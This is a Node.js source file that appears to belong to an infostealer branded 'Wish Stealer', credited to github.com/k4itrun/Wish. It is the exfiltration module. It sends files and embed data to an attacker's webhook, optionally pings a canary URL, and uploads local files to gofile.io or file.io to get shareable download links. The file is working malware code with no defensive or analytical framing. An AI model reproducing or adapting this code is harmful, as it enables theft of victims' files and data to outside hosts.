const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const MAX_FILE_SIZE_MB = 8;
const MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024; 

const webhook = async (webhookUrl, data, files = [], canary) => {
    const form = new FormData();
    let fileCount = 0;

    for (const file of files) {
        const fileSize = fs.statSync(file).size;

        if (fileSize > MAX_FILE_SIZE_BYTES) {
            continue;
        }

        const fileStream = fs.createReadStream(file);
        form.append(`file[${fileCount}]`, fileStream, { filename: file });
        fileCount++;
    }

    if (fileCount > 10) {
        await webhook(webhookUrl, data);
        for (let i = 0; i < fileCount; i++) {
            await webhook(webhookUrl, {
                ...data,
                content: `Attachment ${i + 1}: \`${files[i]}\``
            }, [files[i]]);
        }
        return;
    }

    data.username = 'Wish Stealer';
    data.avatar_url = 'https://avatars.githubusercontent.com/u/181030699';

    if (data.embeds) {
        for (const embed of data.embeds) {
            embed.color = parseInt('ab3cf5', 16);
            embed.footer = {
                text: 'github.com/k4itrun/Wish - made by k4itrun',
                icon_url: 'https://avatars.githubusercontent.com/u/103044629'
            };
            embed.timestamp = new Date();
        }
    }

    form.append('payload_json', JSON.stringify(data));

    try {
        await axios.post(webhookUrl, form, {
            headers: {
                ...form.getHeaders()
            }
        });
        if (canary) {
            await axios.get(canary);
        }
    } catch (error) {
        console.error('Error sending webhook:', error);
    }
};

const serverGofile = async () => {
    try {
        const response = await axios.get('https://api.gofile.io/servers', {}, {
            headers: {
                'referrer': 'https://gofile.io/uploadFiles',
                'accept-language': 'en-US,en;',
                'cache-control': 'no-cache',
                'user-agent': 'Mozilla/5.0',
                'origin': 'https://gofile.io',
                'pragma': 'no-cache',
                'accept': '*/*',
                'mode': 'cors',
                'dnt': 1,
            },
        });
        if (response.data.status !== 'ok') return null;
        const servers = response.data.data.servers;
        return servers[Math.floor(Math.random() * servers.length)].name;
    } catch (error) {
        return null;
    }
};

const uploadGofile = async (filePath, server) => {
    const form = new FormData();
    form.append('file', fs.createReadStream(filePath));
    try {
        const response = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
            headers: {
                'referrer': 'https://gofile.io/uploadFiles',
                'accept-language': 'en-US,en;',
                'cache-control': 'no-cache',
                'user-agent': 'Mozilla/5.0',
                'origin': 'https://gofile.io',
                'pragma': 'no-cache',
                'accept': '*/*',
                'mode': 'cors',
                'dnt': 1,
                ...form.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        });
        return response.data.downloadPage || null;
    } catch (error) {
        return null;
    }
};

const uploadFileio = async (filePath) => {
    const form = new FormData();
    form.append('file', fs.createReadStream(filePath));
    form.append('maxdownloads', '30');
    try {
        const response = await axios.post('https://file.io/', form, {
            headers: { 
                ...form.getHeaders()
            },
        });
        return response.data.link || null;
    } catch (error) {
        return null;
    }
};

const upload = async (filePath) => {
    let link = null;
    try {
        const server = await serverGofile();
        if (server) {
            link = await uploadGofile(filePath, server);
        };

        if (!link) {
            link = await uploadFileio(filePath);
        };

        return link;
    } catch (error) {
        console.error('Error uploading file:', error);
        return null;
    }
};


module.exports = {
    webhook,
    upload,
}